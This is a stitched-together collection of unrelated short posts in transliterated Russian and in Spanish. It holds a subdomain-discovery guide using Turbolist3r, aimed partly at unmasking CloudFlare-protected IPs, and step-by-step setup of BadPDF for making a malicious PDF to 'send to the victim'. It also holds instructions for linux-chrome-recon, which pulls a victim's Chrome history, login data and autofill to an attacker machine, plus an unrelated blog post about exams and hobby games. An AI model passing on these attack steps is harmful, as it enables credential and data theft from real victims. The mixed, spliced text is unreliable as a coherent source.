Poisk poddomenov saita    Poddomen - eto domen, kotoryi prinadlezhit osnovnomu domenu bolee vysokogo urovnia. Primeniaetsia v osnovnom dlia otdel'nykh bol'shikh samostoiatel'nykh razdelov, kategorii i servisov, kotorye prinadlezhat odnoi i toi zhe organizatsii.    No zachem voobshche iskat' poddomeny u saita?  Delo v tom, chto poddomeny mogut byt' dovol'no uiazvimymi. Dovol'no chasti proiskhodiat situatsii, kogda vladel'tsy prosto zabyvaiut pro svoi poddomeny, togda eto mozhet vyiti v bol'shuiu ugrozu bezopasnosti dlia vsego saita.  Slyshali o zashchite CloudFlare? Ona skryvaet real'nyi IP saita i zashchishchaet ot DDOS Atak. Poddomeny eshchio mogut vydat' i real'nyi IP saita, kotoryi nakhoditsia pod zashchitoi CloudFlare.    V poiske poddomenov nam pomozhet Turbolist3r      Ustanovka v Linux/Termux     git clone https://github.com/fleetcaptain/Turbolist3r   cd Turbolist3r   pip3 install -r requirements.txt    Ispol'zovanie     python3 turbolist3r.py -h - pomoshch'   python3 turbolist3r.py -d google.com - tol'ko poisk poddomenov   python3 turbolist3r.py -d google.com -a - poisk poddomenov + DNS    Sushchestvuiut razlichnye parametry, takie kak skanirovanie portov, perebor na poddomenakh, vkhodnye i vykhodnye faily, DNS-preobrazovateli.    Polnyi spisok vsekh parametrov i primery ispol'zovaniia mozhno naiti na GitHub (https://github.com/fleetcaptain/Turbolist3r)

Troian cherez .pdf fail    BadPDF - utilita dlia sozdaniia vredonosnogo PDF-faila  Metod srabotaet tol'ko dlia "Adobe Acrobat".     Ustanovka:     apt install git python3     git clone https://github.com/deepzec/Bad-Pdf.git     cd Bad-Pdf     chmod +x badpdf.py     Zapusk:     ./badpdf.py    Ispol'zovanie:  1)Ispol'zuem defoltnyi put' dlia responder.  2)Vvodim IP-adres vashego ustroistva.  3)Pishem itogovoe imia dlia PDF-Faila(s .pdf).  4)Vybiraem interfeis dlia proslushivaniia.  5)Vsio, teper' v papke s utilitoi dolzhen poiavit'sia vredonosnyi PDF-Fail.    Otpravliaem zhertve i zhdiom otklika v terminale.

Sdal nakonets vse ekzameny s pozorom i unizheniem. No glavnoe sdal   Est' veroiatnost', chto menee chem cherez polgoda eto vsio povtoritsia, odnako eto uzhe sovsem drugaia istoriia.  Sidet' bez progerstva ia ne mog i poetomu zachem-to nemnogo obnovil proekt konsol'nogo Mario - https://github.com/vuvk/console_mario  (glavnyi klass prichesal i zavisimosti obnovil). Okazyvaetsia on ne tol'ko v okne swing risuetsia, no i prekrasno rabotaet v emuliatore Terminala Linukha i v terminale Linukha bez Iksov. Skachat' novuiu sborku neveroiatnogo Mario mozhno po ssylke https://github.com/vuvk/console_mario/releases/download/0.1.1/console_mario.tar.gz (nuzhna predustanovlennaia JRE ili JDK ne nizhe vos'moi versii).  A eshchio nakidal igru bloki na Java i Python. Khotel tipa zadeistvovat' minimum failov i importov, poetomu obe versii v odnom faile po ok.200 strok kazhdyi. Na Pitone slozhno koroche pisat' - iskal polchasa bag iz-za opechatki.  Na Iave ispol'zuetsia shtatnoe awt (na kotoruiu ia i khochu dvizhok perenesti) poetomu nichego ne nado krome JVM (JRE ili JDK), na Pitone nuzhen pygame, kotoryi nado ustanavlivat' cherez pip3 install pygame ili na Ubunte cherez apt install python3-pygame Po kanonu nado bylo pitonovuiu versiiu s pomoshch'iu tkinter delat', chtob vsio shtatnoe, no cho-to uzhe len'. Esli kto-to nakidaet, to budet interesno posmotret'  prisylaite. Ili na drugikh IaP. Ustroim sorevnovanie?  Smysl igry - tykat' na oblasti, v kotorykh riadom po gorizontali-vertikali bol'she odnogo bloka odnogo tsveta, te vzryvaiutsia i verkhnie bloki padaiut vniz. I vsio do tekh por poka est' pary.  Ssylki dlia skachivaniia Iavy i Pitona, esli u tebia ikh do sikh por net na Vende (ili chto tam u tebia): https://www.python.org/downloads/ https://libericajdk.ru/pages/liberica-jdk/  Bloki na Iave i Pitone vmeste s iskhodnikami prilagaiutsia (7 pereimenovat' v 7z).

"linux-chrome-recon" es una herramienta de recopilacion de informacion que se utiliza para enumerar todos los datos posibles sobre un usuario del navegador Google-Chrome de cualquier distribucion de Linux.  Intro 1.Bota los datos posibles de Google-Chrome 2.Inicia el servidor HTTP en el directorio / tmp (util) 3.Secuencia de comandos simple para recibir datos de la victima (ejecucion unica) 4.Borra los datos / tmp cuando el servidor esta cerrado ...  Archivos recuperados: Historia Creditos de inicio de sesion (no se pueden obtener contrasenas porque esta encriptado) Palabras clave buscadas Autocompletar datos Historial de descargas Mejores sitios Imagenes de perfil de usuario  Instalacion  git clone https://github.com/monishmonish/linux-chrome-recon/ cd linux-chrome-recon/ pip3 install pandas pip3 install wget  Correr 1.En la maquina de victimas  python3 server.py 2.En la maquina de ataque  python3 receivedata.py Aqui el valor RHOST debe ser la IP de la maquina Victime  En caso de que obtenga algun error de permiso al escribir los datos en el lado del atacante, intente,  sudo chmod 777 linux-chrome-recon  Link https://github.com/monishmonish/linux-chrome-recon
